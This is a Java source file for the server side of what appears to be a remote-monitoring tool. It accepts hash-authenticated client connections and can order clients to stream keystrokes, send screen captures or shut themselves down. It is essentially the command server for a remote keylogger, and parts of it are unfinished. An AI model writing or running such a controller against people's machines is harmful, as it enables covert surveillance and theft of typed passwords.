package net;

import head.RemoteMonitorServer;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

public class ConnectionServer {

	private ArrayList<Connection> clients;

	/**
	 * Initializes the client list. Server will not be initialized, and should be
	 * done through intitializeServer()
	 * @throws IOException
	 */
	public ConnectionServer() throws IOException {
		// Initialize client list
		clients = new ArrayList<Connection>();
	}

	/**
	 * Initializes the server. Once initializes, program will accept incoming
	 * TCP socket connections from clients. Authentication will occur in a new thread
	 * 
	 * @param hash Authentication hash to confirm connection
	 * @param port TCP connection port 
	 * @throws IOException
	 */
	public void initializeServer(String hash, int port) throws IOException {
		// Set up TCP listener
		@SuppressWarnings("resource")
		ServerSocket connListener = new ServerSocket(port);
		while (true) {

			// Listens indefinitely for clients
			Socket client = connListener.accept();

			// Creates a new connection which listens for stuff in its own thread
			Connection connection = new Connection(client, hash);
			Thread clientThread = new Thread(connection);
			clientThread.start();
			clients.add(connection);
			System.out.println("NEW CONNECTION ESTABLISHED: " + connection.getAddress());
		}
	}

	public synchronized void removeConnection(InetAddress client) {
		// Finds the selected client and removes it
		for (int i = 0; i < clients.size(); i++)
			if (clients.get(i).getAddress().equals(client.getAddress())) {
				clients.remove(i);
				return;
			}
	}
	
	/**
	 * Sends a request to a specific client computer. If there is an operation that
	 * is progress, it will be cancelled
	 * @param client The IP address of the target computer
	 * @param header The header request to be made to the computer
	 */
	public synchronized void requestOperation(InetAddress client, String header) {

		// Clears all running thread operations
		for (int i = 0; i < clients.size(); i++)
			if (clients.get(i).isOperationRunning()) clients.get(i).killOperation();

		// Finds the requested thread
		for (int i = 0; i < clients.size(); i++)
			if (clients.get(i).getAddress().equals(client.getHostAddress())) {
				clients.get(i).requestOperation(header);
				return;
			}
	}

	/**
	 * Returns a list of all connected computers
	 * @return List of the IP addresses of all connected clients
	 */
	public ArrayList<InetAddress> getConnectionList() {
		ArrayList<InetAddress> connectionList = new ArrayList<InetAddress>();
		for (Connection connection : clients)
			connectionList.add(connection.getInetAddress());
		return connectionList;
	}

	/**
	 * Manages the connection between a client and the server
	 * @author Caleb Choi
	 */
	private class Connection implements Runnable {

		private Socket connection;
		private String clientAddress;
		private String clientHostName;
		private String hash;

		private InputStreamReader input;
		private DataOutputStream output;

		private Thread operation;

		/**
		 * Initializes the connection with the client. Authentication and communication
		 * will not occur here, but must be run through a new thread
		 * @param connection Socket connection with client
		 * @param hash Client authentication hash
		 * @throws IOException
		 */
		public Connection(Socket connection, String hash) throws IOException {
			this.connection = connection;
			this.clientAddress = this.connection.getInetAddress().getHostAddress();
			this.clientHostName = this.connection.getInetAddress().getHostName();
			this.hash = hash;

			input = new InputStreamReader(this.connection.getInputStream());
			output = new DataOutputStream(this.connection.getOutputStream());
			output.flush();
		}

		public String getAddress() {return clientAddress;}
		public String getHostName() {return clientHostName;}
		public InetAddress getInetAddress() {return connection.getInetAddress();} 

		/**
		 * Requests a client operation. If there is one in progress, it will be killed
		 * @param header
		 */
		public void requestOperation(final String header) {
			if (operation != null)
				killOperation();

			if (header.equals(PacketHeader.KEYL)) { // Starts a new thread that listens for client keystrokes
				operation = new Thread(new Runnable() {
					@Override
					public void run() {
						try {
							// Sends a request packet to the client to start keylogging functions
							output.writeBytes(header + System.getProperty("line.separator"));

							// Keep listening until thread is interrupted
							BufferedReader bufferedInput = new BufferedReader(input);
							while (!Thread.currentThread().isInterrupted()) {
								if (input.ready()) {
									String keystroke = bufferedInput.readLine();
									System.out.print(keystroke);
									// TODO add keystroke to GUI
								}
							}
							
							// Once thread is interrupted, send message to client to stop recording keystrokes
							output.writeBytes(header + System.getProperty("line.separator"));
							
						} catch (IOException e) { // IOException means the client disconnected
							System.out.println("CLIENT " + connection.getInetAddress().getHostAddress() + " DISCONNECTED");
							try { // Will try to close all output streams
								input.close();
								output.close();
								connection.close();
								System.out.println("CLOSING CLIENT CONNECTION");
							} catch (IOException e1) {System.out.println("CLIENT CONNECTION COULD NOT BE CLOSED");}
							removeConnection(connection.getInetAddress());
						}
					}
				});
				operation.start();
				
			} else if (header.equals(PacketHeader.PICT)) { // Tells client to send a screencap over
				operation = new Thread(new Runnable() {
					@Override
					public void run() {
						try {
							// Sends a request packet to the client to send a screen capture
							output.writeBytes(header + System.getProperty("line.separator"));

							while (!Thread.currentThread().isInterrupted()) {

							}
						} catch (IOException e) { // IOException means the client disconnected
							System.out.println("CLIENT " + connection.getInetAddress().getHostAddress() + " DISCONNECTED");
							try { // Will try to close all output streams
								input.close();
								output.close();
								connection.close();
								System.out.println("CLOSING CLIENT CONNECTION");
							} catch (IOException e1) {System.out.println("CLIENT CONNECTION COULD NOT BE CLOSED");}
							removeConnection(connection.getInetAddress());
						}
					}
				});
				operation.start();
				
			} else if (header.equals(PacketHeader.KILL)) { // Tells client to terminate its existence
				
				// Try to send a kill request to client
				try {output.writeBytes(header + System.getProperty("line.separator"));} 
				catch (IOException e) {System.out.println("KILL REQUEST WAS UNABLE TO BE SENT");}
				
				finally { // Regardless of whether the kill request was able to be sent, server closes client
					System.out.println("CLIENT " + connection.getInetAddress().getHostAddress() + " DISCONNECTED");
					try { // Will try to close all output streams
						input.close();
						output.close();
						connection.close();
						System.out.println("CLOSING CLIENT CONNECTION");
					} catch (IOException e1) {System.out.println("CLIENT CONNECTION COULD NOT BE CLOSED");}
					
					// Removes connection from the 
					removeConnection(connection.getInetAddress());
				}
			} else System.out.println("INVALID REQUEST HEADER - IGNORING REQUEST TO " + getAddress());
		}

		/**
		 * Returns a boolean indicating whether an operation is currently running
		 * @return Boolean representing the state of an operation
		 */
		public boolean isOperationRunning() {
			return !(operation == null || operation.isInterrupted());
		}

		/**
		 * Stops the current operation if there is one
		 */
		public void killOperation() {
			if (operation != null) {
				operation.interrupt();
				operation = null;
			}
		}

		@Override
		public void run() {

			// Listens for the authentication packet
			while (true) {
				try {
					// If there is input to be read
					BufferedReader bufferedInput = new BufferedReader(input);
					if (input.ready()) {
						String[] authMessage = bufferedInput.readLine().split(" ");

						// Checks to see if the header and hash for authentication is valid
						if (authMessage[0].equals(PacketHeader.AUTH)) {
							System.out.println("AUTHENTICATION PACKET RECEIVED:" + clientAddress);

							// Check if the client hash matches
							if (authMessage[1].equals(hash)) {
								System.out.println("CLIENT HASH MATCHED");
								System.out.println(clientAddress + "  SUCCESSFULLY CONNECTED");
								break;

							} else { // If the hashes don't match, kill connection
								System.out.println("ERROR: HASH MISMATCH");
								throw new Exception("Hash mismatch");
							}

						} else { // If the header is invalid
							System.out.println("ERROR: INVALID AUTHENTICATION HEADER");
							throw new Exception("Invalid authentication header");
						}
					}
				} catch (Exception e) {
					System.out.println("EXITING THREAD");
					e.printStackTrace();
					try {
						connection.close();
						System.out.println("CONNECTION TERMINATED");
					} catch (Exception ex) {
						System.out.println("CONNECTION COULD NOT BE TERMINATED");}
					return;
				}
			}

			// Sends back a confirmation packet to the client
			try {
				output.writeBytes(PacketHeader.CONN + " " + hash + System.getProperty("line.separator"));
				System.out.println("CONFIRMATION PACKET SENT");
			} catch (IOException e) {
				System.out.println("CONFIRMATION PACKET COULD NOT BE SENT");
				try {
					connection.close();
					System.out.println("TERMINATING CONNECTION");
				} catch (Exception ex) {
					System.out.println("CONNECTION COULD NOT BE TERMINATED");}
				return;
			}
			System.out.println(clients.size() + " Connected clients");

			// Updates the client list in the GUI
			RemoteMonitorServer.updateClientList();

		}

	}

}
